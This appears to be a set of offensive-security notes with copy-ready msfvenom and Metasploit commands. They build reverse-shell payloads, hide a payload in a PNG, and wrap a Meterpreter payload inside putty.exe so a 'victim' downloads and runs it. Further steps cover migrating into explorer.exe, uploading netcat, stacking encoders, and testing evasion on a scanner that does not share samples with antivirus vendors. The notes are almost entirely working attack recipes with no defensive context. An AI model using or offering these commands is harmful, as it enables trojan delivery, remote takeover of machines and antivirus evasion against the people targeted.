*--> Typical shellcode has a length of 300 to 400 Bytes*

## Example: Hide payload in benign file
- `msfvenom -p php/meterpreter/reverse_tcp lhost=IPv4 lport=8080 >> /home/Desktop/123.png`

## Example: Reverse Shell

**1. Kali**
- `msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=IPv4 LPORT=443 -f exe -o payload`
   - for Android application: -f raw (because .apkis not available)
   - Optional: msfvenom --list formats (to check available formats)
   - Optional: msfvenom --list payloads (to check available payloads)

**2. Windows: Let victim download malware**

**3. Kali**
- msfconsole use exploit/multi/handler
- set payload windows/meterpreter_reverse_tcp
- set LHOST (Best Practice: 0.0.0.0 = accept connection on all IPs from anyone)
- set LPORT 443
- run

**4. Windows: Execute Malware**

**5. Kali: Meterpreter** 
- upload /usr/share/windows-binaries/nc.exe (upload further software on target)
- Info gathering on target: getuid, getprivs, getsystem
- Implement other extensions: load -l (Bsp: kiwi)

## Example: Putty-Trojan

- Carrier Application (CA): putty.exe 32Bit Binary File
- Wrapper: msfvenom (to combine payload and CA) 

1. `msfvenom -p windows/meterpreter_reverse_tcp LHOST=IPv4 LPORT=8080 -x /root/putty.exe -k -f exe -o /var/www/html/putty.exe`
   - x = Carrier Application
   - k = to execute both payload and carrier application 
2. Let victim download carrier application onto target system 
3. Kali: Meterpreter exploit/multi/handler 
4. Session starts/closes as soon as carrier application gets executed/closed
5. Attach your payload to another legitimate process to get independent of carrier application:
   - Example of legitimate process on Windows: explorer.exe 
   - Open terminal on Windows target system: `ps -S explorer`
   - remember PID 
6. Meterpreter: migrate [PID]

## Obfuscation Best Practice

1. Encoder: modify/rewrite binary
2. Packer: compression
3. Crypter: simple encryption
4. Wrapper/Embedder: hide payload inside legitimate program
5. Encryption (SSH, Ipsec, TLS)
6. Steganography
7. Covert Channel (misuse of legitimates channels)
8. Self written Payload has best stealth potential!

## Encoding

**Get an overview**
- `msfvenom -l encoders`

**Encoding Example #1**
- `msfvenom -p windows/meterpreter_reverse_tcp LHOST=IPv4 LPORT=8080 -a x86 --platform windows -e x86/shikata_ga_nai -i 130 -x /root/putty.exe -k -f exe -o /var/www/html/putty.exe`

**Encoding Example #2**
- `msfvenom -p windows/meterpreter_reverse_tcp LHOST=IPv4 LPORT=8080 -a x86 --platform windows -e x86/countdown -i 10 -x /root/putty.exe -k -f raw | msfvenom -a x86 --platform windows -e shikata_ga_nai -i 15 -f exe -o double-encoded-putty.exe`


## Check Payload Stealthiness

- [www.virustotal.com](www.virustotal.com)
    - more AV-filters in place but distribution of payload among AV-companies
- [www.nodistribute.com](www.nodistribute.com)
    - less AV-filters in place but no distribution of payload among AV-companies 
